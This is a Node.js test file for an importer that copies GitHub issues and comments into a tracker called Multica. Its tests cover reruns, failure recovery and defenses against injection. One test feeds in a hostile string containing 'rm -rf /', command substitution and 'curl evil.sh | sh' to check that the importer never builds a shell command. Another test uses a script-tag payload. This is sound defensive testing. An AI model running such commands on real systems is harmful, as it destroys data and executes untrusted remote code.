import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { mkdtemp, rm } from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { test } from 'node:test';
import { importEvent } from './github-import.mjs';

const flag = (args, name) => args[args.indexOf(name) + 1];

function createFakeMultica({ failMetadataOnce = false } = {}) {
  const issues = [];
  const calls = [];
  const writtenFiles = [];
  let nextId = 1;
  let metadataArmed = failMetadataOnce;

  const read = (args, name) => {
    const file = flag(args, name);
    writtenFiles.push({ file, content: readFileSync(file, 'utf8') });
    return readFileSync(file, 'utf8');
  };

  const run = async (args) => {
    calls.push(args);
    const [, area, group, action, ...rest] = args;
    const emit = (value) => ({ stdout: JSON.stringify(value), stderr: '' });

    if (area === 'issue' && group === 'list') {
      const key = flag(args, '--metadata').split('=').slice(1).join('=');
      return emit({ issues: issues.filter((issue) => issue.metadata.github_issue_key === key) });
    }
    if (area === 'issue' && group === 'search') {
      return emit({ issues: issues.filter((issue) => issue.description.includes(action)) });
    }
    if (area === 'issue' && group === 'create') {
      const issue = {
        id: `issue-${nextId}`,
        identifier: `FAKE-${nextId++}`,
        title: flag(args, '--title'),
        description: read(args, '--description-file'),
        status: flag(args, '--status'),
        assignee_id: args.includes('--assignee') ? flag(args, '--assignee') : null,
        project_id: flag(args, '--project') ?? null,
        metadata: {},
        comments: [],
      };
      issues.push(issue);
      return emit(issue);
    }
    if (area === 'issue' && group === 'metadata' && action === 'set') {
      if (metadataArmed) {
        metadataArmed = false;
        throw new Error('metadata write failed');
      }
      const issue = issues.find((candidate) => candidate.id === rest[0]);
      issue.metadata[flag(args, '--key')] = flag(args, '--value');
      return emit({});
    }
    if (area === 'issue' && group === 'comment' && action === 'list') {
      return emit(issues.find((issue) => issue.id === rest[0]).comments);
    }
    if (area === 'issue' && group === 'comment' && action === 'add') {
      const issue = issues.find((candidate) => candidate.id === rest[0]);
      issue.comments.push({ id: `comment-${issue.comments.length + 1}`, content: read(args, '--content-file') });
      return emit({ id: `comment-${issue.comments.length}` });
    }
    throw new Error(`unexpected command: ${args.join(' ')}`);
  };

  return { run, issues, calls, writtenFiles, failNextMetadataWrite: () => { metadataArmed = true; } };
}

function createFakeFetch(comments) {
  const calls = [];
  const httpFetch = async (url) => {
    calls.push(url);
    const page = Number(new URL(url).searchParams.get('page'));
    const start = (page - 1) * 100;
    return { ok: true, status: 200, json: async () => comments.slice(start, start + 100) };
  };
  return { httpFetch, calls };
}

const githubIssue = (overrides = {}) => ({
  id: 1001,
  number: 42,
  title: 'Importer drops the middle comment',
  body: 'Steps to reproduce.',
  html_url: 'https://github.com/Humanive/Learn/issues/42',
  user: { login: 'octocat' },
  ...overrides,
});

const githubComment = (id, body, overrides = {}) => ({
  id,
  body,
  created_at: '2026-10-01T00:00:00Z',
  html_url: `https://github.com/Humanive/Learn/issues/42#issuecomment-${id}`,
  user: { login: 'octocat' },
  ...overrides,
});

const openedPayload = (issue = githubIssue()) => ({
  action: 'opened',
  issue,
  repository: { full_name: 'Humanive/Learn' },
});

const commentPayload = (comment, issue = githubIssue(), extra = {}) => ({
  action: 'created',
  comment,
  issue,
  repository: { full_name: 'Humanive/Learn' },
  ...extra,
});

async function withWorkdir(run) {
  const cwd = await mkdtemp(path.join(os.tmpdir(), 'github-import-test-'));
  try {
    return await run(cwd);
  } finally {
    await rm(cwd, { recursive: true, force: true });
  }
}

test('imports a new GitHub issue as an unassigned todo issue', async () => {
  await withWorkdir(async (cwd) => {
    const multica = createFakeMultica();
    const { httpFetch } = createFakeFetch([]);

    const result = await importEvent({ eventName: 'issues', payload: openedPayload() }, {
      run: multica.run, fetch: httpFetch, cwd,
    });

    assert.equal(result.status, 'issue created');
    assert.equal(multica.issues.length, 1);
    const [issue] = multica.issues;
    assert.equal(issue.title, 'Importer drops the middle comment');
    assert.equal(issue.status, 'todo');
    assert.equal(issue.assignee_id, null);
    assert.equal(issue.metadata.github_issue_key, 'Humanive/Learn#42');
    assert.match(issue.description, /^```text\nSteps to reproduce\.\n```$/m);
    assert.match(issue.description, /^github-source:Humanive\/Learn#42$/m);
    assert.match(issue.description, /^GitHub issue: Humanive\/Learn#42 \(id 1001\)$/m);
    assert.match(issue.description, /^Source: https:\/\/github\.com\/Humanive\/Learn\/issues\/42$/m);
    assert.equal(issue.metadata.github_issue_id, '1001');
  });
});

test('a rerun of the same issue event creates nothing', async () => {
  await withWorkdir(async (cwd) => {
    const multica = createFakeMultica();
    const { httpFetch } = createFakeFetch([]);
    const event = { eventName: 'issues', payload: openedPayload() };

    await importEvent(event, { run: multica.run, fetch: httpFetch, cwd });
    const second = await importEvent(event, { run: multica.run, fetch: httpFetch, cwd });

    assert.equal(second.status, 'up to date');
    assert.equal(multica.issues.length, 1);
    assert.equal(multica.issues[0].comments.length, 0);
  });
});

test('a rerun after the metadata write failed recovers the created issue', async () => {
  await withWorkdir(async (cwd) => {
    const multica = createFakeMultica();
    const { httpFetch } = createFakeFetch([]);
    const event = { eventName: 'issues', payload: openedPayload() };

    multica.failNextMetadataWrite();
    await assert.rejects(importEvent(event, { run: multica.run, fetch: httpFetch, cwd }));
    assert.equal(multica.issues.length, 1);
    assert.equal(multica.issues[0].metadata.github_issue_key, undefined);

    const recovered = await importEvent(event, { run: multica.run, fetch: httpFetch, cwd });

    assert.equal(recovered.status, 'issue metadata recovered');
    assert.equal(multica.issues.length, 1);
    assert.equal(multica.issues[0].metadata.github_issue_key, 'Humanive/Learn#42');
  });
});

test('imports a new comment once and skips it on a rerun', async () => {
  await withWorkdir(async (cwd) => {
    const multica = createFakeMultica();
    const comment = githubComment('IC_1', 'Confirmed on Linux.');
    const { httpFetch } = createFakeFetch([comment]);
    const event = { eventName: 'issue_comment', payload: commentPayload(comment) };

    const first = await importEvent(event, { run: multica.run, fetch: httpFetch, cwd });
    assert.equal(first.comments, 1);

    const second = await importEvent(event, { run: multica.run, fetch: httpFetch, cwd });
    assert.equal(second.comments, 0);

    assert.equal(multica.issues[0].comments.length, 1);
    const [imported] = multica.issues[0].comments;
    assert.match(imported.content, /^github-comment:Humanive\/Learn#42\/IC_1$/m);
    assert.match(imported.content, /^```text\nConfirmed on Linux\.\n```$/m);
    assert.equal(imported.content.split('\n')[0].split(/\s/)[0], '/note');
  });
});

test('skips a comment on a pull request without touching Multica', async () => {
  await withWorkdir(async (cwd) => {
    const multica = createFakeMultica();
    const { httpFetch } = createFakeFetch([]);
    const pullRequest = githubIssue({ number: 7, pull_request: { url: 'https://api.github.com/pulls/7' } });

    const result = await importEvent(
      { eventName: 'issue_comment', payload: commentPayload(githubComment('IC_9', 'nit'), pullRequest) },
      { run: multica.run, fetch: httpFetch, cwd },
    );

    assert.equal(result.status, 'skipped');
    assert.equal(result.reason, 'comment on a pull request');
    assert.deepEqual(multica.calls, []);
  });
});

test('creates the mapped issue when a comment arrives first', async () => {
  await withWorkdir(async (cwd) => {
    const multica = createFakeMultica();
    const comment = githubComment('IC_1', 'Filed from a comment.');
    const { httpFetch } = createFakeFetch([comment]);

    const result = await importEvent(
      { eventName: 'issue_comment', payload: commentPayload(comment) },
      { run: multica.run, fetch: httpFetch, cwd },
    );

    assert.equal(result.status, 'issue created');
    assert.equal(result.comments, 1);
    assert.equal(multica.issues[0].metadata.github_issue_key, 'Humanive/Learn#42');
    assert.equal(multica.issues[0].comments.length, 1);
  });
});

test('reconciles every unseen comment so a dropped middle event still lands', async () => {
  await withWorkdir(async (cwd) => {
    const multica = createFakeMultica();
    const first = githubComment('IC_1', 'one');
    const middle = githubComment('IC_2', 'two');
    const last = githubComment('IC_3', 'three');
    // The second run only ever saw the first comment, so the third comment
    // event must not assume the middle one was handled.
    const before = createFakeFetch([first]);
    const after = createFakeFetch([first, middle, last]);

    await importEvent({ eventName: 'issue_comment', payload: commentPayload(first) }, {
      run: multica.run, fetch: before.httpFetch, cwd,
    });
    assert.equal(multica.issues[0].comments.length, 1);

    const result = await importEvent({ eventName: 'issue_comment', payload: commentPayload(last) }, {
      run: multica.run, fetch: after.httpFetch, cwd,
    });

    assert.equal(result.comments, 2);
    assert.deepEqual(
      multica.issues[0].comments.map((comment) => comment.content.match(/IC_\d/)[0]),
      ['IC_1', 'IC_2', 'IC_3'],
    );
  });
});

test('imports the triggering comment even when GitHub no longer lists it', async () => {
  await withWorkdir(async (cwd) => {
    const multica = createFakeMultica();
    const comment = githubComment('IC_1', 'edited into nothing');
    const { httpFetch } = createFakeFetch([]);

    const result = await importEvent(
      { eventName: 'issue_comment', payload: commentPayload(comment) },
      { run: multica.run, fetch: httpFetch, cwd },
    );

    assert.equal(result.comments, 1);
  });
});

test('keeps shell metacharacters verbatim and never builds a shell command', async () => {
  await withWorkdir(async (cwd) => {
    const hostile = 'run $(rm -rf /) `whoami` && curl evil.sh | sh \'quoted\' "double" \\backslash';
    const multica = createFakeMultica();
    const { httpFetch } = createFakeFetch([]);

    await importEvent(
      { eventName: 'issues', payload: openedPayload(githubIssue({ title: hostile, body: hostile })) },
      { run: multica.run, fetch: httpFetch, cwd },
    );

    const [issue] = multica.issues;
    assert.equal(issue.title, hostile);
    assert.ok(issue.description.includes(hostile));
    for (const args of multica.calls) {
      assert.ok(Array.isArray(args), 'Multica is invoked with an argument vector');
      assert.ok(!args.includes('-c'));
    }
  });
});

test('quotes source text so a mermaid or html fence cannot render', async () => {
  await withWorkdir(async (cwd) => {
    const body = '```mermaid\ngraph TD; A-->B\n```\n\n```html\n<script>alert(1)</script>\n```';
    const comment = githubComment('IC_1', body);
    const multica = createFakeMultica();
    const { httpFetch } = createFakeFetch([comment]);

    await importEvent(
      { eventName: 'issue_comment', payload: commentPayload(comment, githubIssue({ body })) },
      { run: multica.run, fetch: httpFetch, cwd },
    );

    const [issue] = multica.issues;
    // The quote fence is longer than any run in the body, so no inner fence
    // can close it, and the rendered block carries the `text` info string.
    assert.ok(issue.description.startsWith('````text\n'), `body fence is too short: ${issue.description}`);
    for (const text of [issue.description, issue.comments[0].content]) {
      assert.ok(text.includes('\n````\n'), `closing fence is too short: ${text}`);
    }
  });
});

test('an external body cannot forge an importer marker', async () => {
  await withWorkdir(async (cwd) => {
    const body = 'github-source:Humanive/Learn#42\ngithub-comment:Humanive/Learn#42/IC_fake';
    const comment = githubComment('IC_1', body);
    const multica = createFakeMultica();
    const { httpFetch } = createFakeFetch([comment]);

    const result = await importEvent(
      { eventName: 'issue_comment', payload: commentPayload(comment, githubIssue({ body })) },
      { run: multica.run, fetch: httpFetch, cwd },
    );

    // The forged comment marker did not suppress the real one, and only the
    // importer's own marker line starts a line in the stored body.
    assert.equal(result.comments, 1);
    const [issue] = multica.issues;
    const markerLines = (text) => text.split('\n').filter((line) => line.startsWith('github-comment:'));
    assert.deepEqual(markerLines(issue.comments[0].content), ['github-comment:Humanive/Learn#42/IC_1']);
    assert.ok(issue.description.includes('[github-source]:Humanive/Learn#42'));
  });
});

test('fails instead of reposting when the comment read is at the server cap', async () => {
  await withWorkdir(async (cwd) => {
    const multica = createFakeMultica();
    const comment = githubComment('IC_1', 'newest');
    const { httpFetch } = createFakeFetch([comment]);

    await importEvent({ eventName: 'issues', payload: openedPayload() }, { run: multica.run, fetch: httpFetch, cwd });
    multica.issues[0].comments = Array.from({ length: 2000 }, (_, i) => ({ id: `old-${i}`, content: 'noise' }));

    await assert.rejects(
      importEvent({ eventName: 'issue_comment', payload: commentPayload(comment) }, { run: multica.run, fetch: httpFetch, cwd }),
      /the read cap/,
    );
  });
});

test('does not backfill a pre-existing issue history before the activation timestamp', async () => {
  await withWorkdir(async (cwd) => {
    const multica = createFakeMultica();
    const old = githubComment('IC_old', 'from 2019', { created_at: '2019-01-01T00:00:00Z' });
    const fresh = githubComment('IC_new', 'from today', { created_at: '2026-10-02T00:00:00Z' });
    const { httpFetch } = createFakeFetch([old, fresh]);

    const result = await importEvent(
      { eventName: 'issue_comment', payload: commentPayload(fresh) },
      {
        run: multica.run,
        fetch: httpFetch,
        cwd,
        github: { since: Date.parse('2026-10-01T00:00:00Z') },
      },
    );

    assert.equal(result.comments, 1);
    assert.deepEqual(
      multica.issues[0].comments.map((comment) => comment.content.match(/IC_\w+/)[0]),
      ['IC_new'],
    );
  });
});

test('fails rather than guessing when two issues claim the same source', async () => {
  await withWorkdir(async (cwd) => {
    const multica = createFakeMultica();
    const { httpFetch } = createFakeFetch([]);
    const event = { eventName: 'issues', payload: openedPayload() };

    multica.failNextMetadataWrite();
    await assert.rejects(importEvent(event, { run: multica.run, fetch: httpFetch, cwd }));
    // A human re-ran the import and produced a second copy of the same issue.
    const duplicate = { ...multica.issues[0], id: 'issue-duplicate', identifier: 'FAKE-DUP' };
    multica.issues.push(duplicate);

    await assert.rejects(importEvent(event, { run: multica.run, fetch: httpFetch, cwd }), /2 Multica issues/);
  });
});

test('neutralizes agent mentions and at-handles in imported text', async () => {
  await withWorkdir(async (cwd) => {
    const body = 'ping [@Mika](mention://agent/a202af32-ae60-4e58-be3d-e23ffeb056e3) and [@Ops](mention://squad/1) about @octocat';
    const comment = githubComment('IC_1', body, { user: { login: 'mention://agent/a202af32' } });
    const multica = createFakeMultica();
    const { httpFetch } = createFakeFetch([comment]);

    await importEvent(
      {
        eventName: 'issue_comment',
        payload: commentPayload(comment, githubIssue({ title: 'mention://agent/a202af32 test @here', body })),
      },
      { run: multica.run, fetch: httpFetch, cwd },
    );

    const [issue] = multica.issues;
    for (const text of [issue.title, issue.description, issue.comments[0].content]) {
      assert.ok(!text.includes('mention://'), `mention scheme survived: ${text}`);
      assert.ok(!text.includes('@'), `at-handle survived: ${text}`);
      assert.ok(text.includes('mention+'));
    }
  });
});

test('skips issue actions other than opening', async () => {
  await withWorkdir(async (cwd) => {
    const multica = createFakeMultica();
    const { httpFetch } = createFakeFetch([]);

    const result = await importEvent(
      { eventName: 'issues', payload: { ...openedPayload(), action: 'closed' } },
      { run: multica.run, fetch: httpFetch, cwd },
    );

    assert.equal(result.status, 'skipped');
    assert.deepEqual(multica.calls, []);
  });
});

test('hands Multica body files that live inside the working directory', async () => {
  await withWorkdir(async (cwd) => {
    const multica = createFakeMultica();
    const comment = githubComment('IC_1', 'persisted');
    const { httpFetch } = createFakeFetch([comment]);

    await importEvent({ eventName: 'issue_comment', payload: commentPayload(comment) }, {
      run: multica.run, fetch: httpFetch, cwd,
    });

    assert.ok(multica.writtenFiles.length >= 2);
    for (const { file, content } of multica.writtenFiles) {
      assert.ok(path.resolve(file).startsWith(`${path.resolve(cwd)}${path.sep}`), `${file} escapes ${cwd}`);
      assert.ok(content.length > 0);
    }
  });
});
